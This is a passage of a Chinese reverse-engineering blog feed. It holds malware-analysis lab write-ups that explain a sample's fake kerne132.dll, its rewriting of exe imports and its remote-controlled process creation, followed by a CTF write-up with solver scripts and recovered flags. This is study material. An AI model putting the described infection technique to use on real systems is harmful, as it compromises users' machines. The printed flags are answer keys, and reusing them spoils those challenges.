class="function">BOOL <span class="title">InternetGetConnectedState</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD lpdwFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   dwReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>在看看程序内部<br><img src="https://i.loli.net/2021/10/08/AIjg2kCQGipDrhT.png"></p><p>代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;wininet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Wininet.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BOOL flag;</span><br><span class="line">flag = InternetGetConnectedState(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Success: Internet Connection&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error 1.1: No Internet&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Lab06-02-exe"><a href="#Lab06-02-exe" class="headerlink" title="Lab06-02.exe"></a>Lab06-02.exe</h3><p>一个读取指定url指定的资源，然后比较前几个字符串。</p><p>用StudyPE打开，还是winnet.dll里面的一些网络相关的函数。</p><p>ida打开分析</p><p>前面一个函数就是上面的lab。</p><p>主要看sub_401040函数<br><img src="https://i.loli.net/2021/10/08/KFY8CwcNjVs9Xio.png"><br>所以其实也没干什么，可能主要代码还在后面。</p><h3 id="Lab06-03-exe"><a href="#Lab06-03-exe" class="headerlink" title="Lab06-03.exe"></a>Lab06-03.exe</h3><p>继续在上面的lab，加了一个函数，添加了一些功能。</p><p><img src="https://i.loli.net/2021/10/09/BgJG8yihQfCIKao.png"><br>来看看sub_401130函数<br><img src="https://i.loli.net/2021/10/09/o5XeCTbJB29D1Lt.png"></p><h3 id="Lab06-04-exe"><a href="#Lab06-04-exe" class="headerlink" title="Lab06-04.exe"></a>Lab06-04.exe</h3><p>加了一个循环，实际上switch中怎么操作 都是由那个html文件的字符来定的，类似小型虚拟机，但switch的操作也就那几种。</p><h2 id="Lab07"><a href="#Lab07" class="headerlink" title="Lab07"></a>Lab07</h2><h3 id="Lab07-01-exe"><a href="#Lab07-01-exe" class="headerlink" title="Lab07-01.exe"></a>Lab07-01.exe</h3><p>和Lab01-02脱壳后一模一样，不再分析。</p><h3 id="Lab07-02-exe"><a href="#Lab07-02-exe" class="headerlink" title="Lab07-02.exe"></a>Lab07-02.exe</h3><p>这个样本是书中组件对象模型(COM)的知识点，下面先看看几个函数</p><p>OleInitialize</p><pre><code>在当前单元上初始化 COM 库</code></pre><p>CoCreateInstance 函数</p><pre><code>创建并默认初始化与指定 CLSID 关联的类的单个对象。HRESULT CoCreateInstance(  REFCLSID  rclsid,  LPUNKNOWN pUnkOuter,  DWORD     dwClsContext,  REFIID    riid,  LPVOID    *ppv);rclsid与将用于创建对象的数据和代码关联的 CLSID。pUnkOuter如果为NULL，则表示该对象不是作为聚合的一部分创建的。如果非NULL，则指向聚合对象的IUnknown接口（控制IUnknown）。dwClsContext管理新创建对象的代码将在其中运行的上下文。这些值取自枚举CLSCTX。riid对用于与对象通信的接口标识符的引用。ppv接收riid 中请求的接口指针的指针变量的地址。成功返回后， * ppv包含请求的接口指针。失败时， * ppv包含NULL。</code></pre><p>重要的就是rclsid和riid，我们可以通过这个 来确定他要调用什么程序，什么接口。如何去查找这两个东西，<a href="https://docs.microsoft.com/en-us/windows/win32/com/clsid">clsid</a>，<a href="https://docs.microsoft.com/en-us/windows/win32/wmformat/interface-identifiers">riid</a>，也就是直接去注册表中搜索，然后这个函数会返回一个COM对象，保存在ppv，可以通过这个对象，来执行一些函数。</p><p>现在我们来分析下程序<br><img src="https://i.loli.net/2021/10/10/GapkhFjcevSdKYn.png"><br>可以看到ppv+0x2c，实际上IWebBrowser2接口的偏移0x2c就是Navigate函数，<a href="https://docs.microsoft.com/en-us/previous-versions//aa752133(v=vs.85)?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/previous-versions//aa752133(v=vs.85)?redirectedfrom=MSDN</a>，也就是用Internet Explorer来访问那个网址。</p><p>这个程序 就和文档中的代码类似</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SUCCEEDED(OleInitialize(<span class="literal">NULL</span>)))</span><br><span class="line">&#123;</span><br><span class="line">   IWebBrowser2*    pBrowser2;</span><br><span class="line"></span><br><span class="line">   CoCreateInstance(CLSID_InternetExplorer, <span class="literal">NULL</span>, CLSCTX_LOCAL_SERVER, </span><br><span class="line">                       IID_IWebBrowser2, (<span class="keyword">void</span>**)&amp;pBrowser2);</span><br><span class="line">   <span class="keyword">if</span> (pBrowser2)</span><br><span class="line">   &#123;</span><br><span class="line">       VARIANT vEmpty;</span><br><span class="line">       VariantInit(&amp;vEmpty);</span><br><span class="line"></span><br><span class="line">       BSTR bstrURL = SysAllocString(<span class="string">L&quot;http://microsoft.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">       HRESULT hr = pBrowser2-&gt;Navigate(bstrURL, &amp;vEmpty, &amp;vEmpty, &amp;vEmpty, &amp;vEmpty);</span><br><span class="line">       <span class="keyword">if</span> (SUCCEEDED(hr))</span><br><span class="line">       &#123;</span><br><span class="line">           pBrowser2-&gt;put_Visible(VARIANT_TRUE);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">           pBrowser2-&gt;Quit();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       SysFreeString(bstrURL);</span><br><span class="line">       pBrowser2-&gt;Release();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   OleUninitialize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Lab07-03-exe"><a href="#Lab07-03-exe" class="headerlink" title="Lab07-03.exe"></a>Lab07-03.exe</h3><p>这个程序和dll配套使用，实际上就是Lab01-01分析的那个程序，实际上 我当时已经分析了很大一部分了，接下来就分析一下没被分析到的部分。样本修改system32中文件的操作在windows10已经不适用了，因为有了文件保护，不允许随便写入。</p><p>首先是为什么字符串中有<strong>kerne132.dll</strong> 和kernel32.dll，而且Lab07-03.dll这个dll文件只有main函数，没有导出函数，这就意味着其他exe无法导入这个dll的函数。</p><p>在CopyFileA的上面我们看到对kernel32.dll，Lab07-03.dll这两个文件进行操作，并且生成了<strong>kerne132.dll</strong>，看到这两个名称我们就可以猜测，我们利用Lab07-03.dll，和很多乱七八糟的操作将system32下的kernel32.dll进行了一些修改，生成了这个<strong>kerne132.dll</strong> ，对于那部分乱七八糟的代码，其实可以不用太关心，也比较难看，只不过可以大概看出是对pe结构进行了一些操作，之后我将程序的参数设置为WARNING_THIS_WILL_DESTROY_YOUR_MACHINE，进行动调来验证这个猜想，在执行完CopyFileA后，我将<strong>C:\windows\system32\kerne132.dll</strong>这个新文件，用ida打开看了看。<br><img src="https://i.loli.net/2021/10/12/tYv5qM72jcX4aOs.png"><br>所以前面这一部分就是生成一个<strong>kerne132.dll</strong>伪装成原来的kernel32.dll，这样操作有什么用呢，看后面的代码就可以知道了。</p><p>后面部分在lab1中说过，遍历了所有exe文件，然后修改了exe中的kernel32.dll变为<strong>kerne132.dll</strong>，所以其实就是在让这些exe加载<strong>kerne132.dll</strong>这个dll，从而执行恶意dll的内容，这种操作还是比较经典的，如何找到一个pe文件的dll名称，并修改他，下面就用pe的知识点，来写一写。</p><p>下面这种方式是用的RAW，因为没有在内存中，如果是在内存中，就要使用RVA。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LARGE_INTEGER liFileSize;</span><br><span class="line">DWORD dwReadedSize;</span><br><span class="line">DWORD dwRVA,pianyi;</span><br><span class="line">HANDLE hFile = CreateFileA(<span class="string">&quot;C:\\Users\\hp\\Desktop\\test\\calc.exe&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">BYTE* baseaddr;</span><br><span class="line">PBYTE pAddr;</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImportDesc;</span><br><span class="line">LPCSTR szLibName;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;CreateFileA error %d&quot;</span>, GetLastError());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件大小</span></span><br><span class="line">GetFileSizeEx(hFile, &amp;liFileSize);</span><br><span class="line"></span><br><span class="line">baseaddr = (BYTE*)<span class="built_in">malloc</span>(liFileSize.QuadPart);</span><br><span class="line"></span><br><span class="line">ReadFile(hFile, baseaddr, liFileSize.QuadPart, &amp;dwReadedSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">pAddr = (PBYTE)baseaddr;</span><br><span class="line">pAddr += *((DWORD*)&amp;pAddr[<span class="number">0x3C</span>]);</span><br><span class="line"></span><br><span class="line">dwRVA= *((DWORD*)&amp;pAddr[<span class="number">0x80</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//因为用的是RAW，所以偏移为 0x400-0x1000，从text节区头获得的。</span></span><br><span class="line">pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)baseaddr + dwRVA+ <span class="number">0x400</span><span class="number">-0x1000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; pImportDesc-&gt;Name; pImportDesc++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n%x &quot;</span>, pImportDesc);</span><br><span class="line">szLibName = (LPCSTR)((DWORD)baseaddr + pImportDesc-&gt;Name + <span class="number">0x400</span> - <span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, szLibName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以，exe中的内容就是先修改了C:\windows\system32\kernel32.dll为<strong>C:\windows\system32\kerne132.dll</strong>，然后将c盘下的exe文件的kernel32.dll改为<strong>kerne132.dll</strong>，从而达到感染这些exe的目的，如果再次启动这些exe，就会载入<strong>kerne132.dll</strong>这个恶意dll，从而造成危害。<br><img src="https://i.loli.net/2021/10/12/cNjZhHrx4aspu3y.png"></p><p>接下来就只剩下分析恶意dll了。<br><img src="https://i.loli.net/2021/10/13/gklAbRnN5cITo1x.png"><br>可以看到就是向一个远程机器发送了一些命令，并且接收了一些东西，关键就在于那个CreateProcess函数，究竟创建了什么进程，这点在ida里面并不能直接找到，来看下一张图片。<br><img src="https://i.loli.net/2021/10/13/ghRZt4SvHYkAoNw.png"><br>所以创建什么进程，实际上是由那个远程机器返回的内容决定的。</p><p>到这里这两个文件，差不多就分析完了。</p><h2 id="Lab09"><a href="#Lab09" class="headerlink" title="Lab09"></a>Lab09</h2><p>这个Lab主要考察动调。</p><h3 id="Lab09-01"><a href="#Lab09-01" class="headerlink" title="Lab09-01"></a>Lab09-01</h3><p>这个exe需要分析的点有点多。之前也提到了，这个程序需要一些参数才能让其执行一些函数。</p><p>我们直接在虚拟机执行一次会发现直接就退出了，并且删除了自身。</p><p>来看看main函数<br><img src="https://i.loli.net/2021/10/18/8mDlge5v37nbZi1.png"><br>然后来看sub_401000函数，我们将其命名为checkReg。</p><p>可以看到这个函数实际上就是检查注册表是否有相关值，没有就会返回1，从而进行delete()函数。</p><p>然后下面的sub_402360函数，里面也有个检查注册表的值的过程，一开始肯定是没有的，所以肯定不会发生什么。</p><p>接下来，我们发现这个程序会使用到一些参数来执行不同的过程，参数分为-in，-re，-c，-cc，并且还有一个密码检查函数。</p><p>我们先来传入-in这个参数，但是我们会发现，会在sub_402510出错，这个函数其实就是个密码检查函数，传入的是最后的一个参数，比如说<br>    Lab09-01.exe -in 1234<br>传入这个函数的就是1234。</p><p>这里提供两个方式来绕过这个密码检查</p><p>第一种直接修改这个函数，让他永远返回1</p><p>第二种是分析这个函数，得到密码。</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 病毒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯 re wp</title>
      <link href="2021/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%20re%20wp/"/>
      <url>2021/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF%20re%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="羊城杯-re-wp"><a href="#羊城杯-re-wp" class="headerlink" title="羊城杯 re wp"></a>羊城杯 re wp</h1><p>题的质量还是可以，有些题因为遇到一些问题，没解出来。花时间来写wp一是巩固一些知识点，还有让更多的人可以互相学习。</p><h2 id="BabySmc"><a href="#BabySmc" class="headerlink" title="BabySmc"></a>BabySmc</h2><p>看题目就知道代码肯定被smc处理过了，所以直接动调就ok，也没有反调试。</p><p>先看前面部分。<br><img src="https://i.loli.net/2021/09/14/bofkqJ9USgZPCvF.png"><br>看看base64加密过程<br><img src="https://i.loli.net/2021/09/14/X7uTJdknDrqhS18.png"><br>密文和比较。<br><img src="https://i.loli.net/2021/09/14/ZTxuEbrtSPiykQY.png"><br>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">t=[]</span><br><span class="line">encstr = <span class="string">&#x27;H&gt;oQn6aqLr&#123;DH6odhdm0dMe`MBo?lRglHtGPOdobDlknejmGI|ghDb&lt;4&#x27;</span></span><br><span class="line">xor = [<span class="number">0xa6</span>, <span class="number">0xa3</span>, <span class="number">0xa9</span>, <span class="number">0xac</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encstr)):</span><br><span class="line">    t.append(<span class="built_in">ord</span>(encstr[i]) ^ xor[i % <span class="number">4</span>])</span><br><span class="line">t[-<span class="number">1</span>]=<span class="number">0xE4</span><span class="comment">#由于最后一个是4，是补的，直接改为表中的一个就行。</span></span><br><span class="line">base1 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">base = [<span class="number">0xE4</span>, <span class="number">0xC4</span>, <span class="number">0xE7</span>, <span class="number">0xC7</span>, <span class="number">0xE6</span>, <span class="number">0xC6</span>, <span class="number">0xE1</span>, <span class="number">0xC1</span>, <span class="number">0xE0</span>, <span class="number">0xC0</span>,</span><br><span class="line">        <span class="number">0xE3</span>, <span class="number">0xC3</span>, <span class="number">0xE2</span>, <span class="number">0xC2</span>, <span class="number">0xED</span>, <span class="number">0xCD</span>, <span class="number">0xEC</span>, <span class="number">0xCC</span>, <span class="number">0xEF</span>, <span class="number">0xCF</span>,</span><br><span class="line">        <span class="number">0xEE</span>, <span class="number">0xCE</span>, <span class="number">0xE9</span>, <span class="number">0xC9</span>, <span class="number">0xE8</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xCB</span>, <span class="number">0xEA</span>, <span class="number">0xCA</span>,</span><br><span class="line">        <span class="number">0xF5</span>, <span class="number">0xD5</span>, <span class="number">0xF4</span>, <span class="number">0xD4</span>, <span class="number">0xF7</span>, <span class="number">0xD7</span>, <span class="number">0xF6</span>, <span class="number">0xD6</span>, <span class="number">0xF1</span>, <span class="number">0xD1</span>,</span><br><span class="line">        <span class="number">0xF0</span>, <span class="number">0xD0</span>, <span class="number">0xF3</span>, <span class="number">0xD3</span>, <span class="number">0xF2</span>, <span class="number">0xD2</span>, <span class="number">0xFD</span>, <span class="number">0xDD</span>, <span class="number">0xFC</span>, <span class="number">0xDC</span>,</span><br><span class="line">        <span class="number">0xFF</span>, <span class="number">0xDF</span>, <span class="number">0x95</span>, <span class="number">0x9C</span>, <span class="number">0x9D</span>, <span class="number">0x92</span>, <span class="number">0x93</span>, <span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x96</span>,</span><br><span class="line">        <span class="number">0x97</span>, <span class="number">0x94</span>, <span class="number">0x8A</span>, <span class="number">0x8E</span>]</span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">    ans += base1[base.index(i)]</span><br><span class="line">print(ans)</span><br><span class="line">print(base64.b64decode(ans))</span><br><span class="line"><span class="comment">#SangFor&#123;XSAYT0u5DQhaxveIR50X1U13M-pZK5A0&#125;</span></span><br></pre></td></tr></table></figure><h2 id="DeltX"><a href="#DeltX" class="headerlink" title="DeltX"></a>DeltX</h2><p>这道题，流程很乱，通过动调看内存会使分析变的简单。但是也有坑，就是flag的大小写的问题，多试吧。</p><p>前面部分。<br><img src="https://i.loli.net/2021/09/14/Z5bfcA7OEgYhiRk.png"><br>中间数据处理。<br><img src="https://i.loli.net/2021/09/14/1z93sQmcqVGIbjo.png"><br>脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a,b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(a=<span class="number">0</span>;a&lt;=<span class="number">0xffff</span>;a++)</span><br><span class="line">&#123;</span><br><span class="line">b=<span class="number">0</span>;</span><br><span class="line">b=(a<span class="number">-0x9393</span>)&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">if</span>(a*b== <span class="number">0xE5FD104</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%X %X&quot;</span>,a,b);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>解出所有数据，拼接起来得到，SangFor{2C7BD2BF862564BAED0B6B6EA94F15BC}，但是不对，然后又一组一组的试，看看哪出了问题，发现是某一组大小写问题，得到SangFor{2C7BD2BF862564baED0B6B6EA94F15BC}</p><h2 id="EasyVM"><a href="#EasyVM" class="headerlink" title="EasyVM"></a>EasyVM</h2><p>elf文件，代码也被加密了，也有自解密函数。</p><p>先看看main函数<br><img src="https://i.loli.net/2021/09/14/Xj1coNve4fPHIYq.png"><br>然后vm内部就只有自己去慢慢调试分析大概逻辑了。</p><p>大概有3中方式加密，前32个字符是异或，然后后面4个是一些运算的加密，后面8个字符又分为两组进行同一种运算方式方式加密。</p><p>写了个c来打印其过程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> opcode[]=&#123; <span class="number">0xA1</span>, <span class="number">0xC1</span>, <span class="number">0x00</span>, <span class="number">0xB1</span>, <span 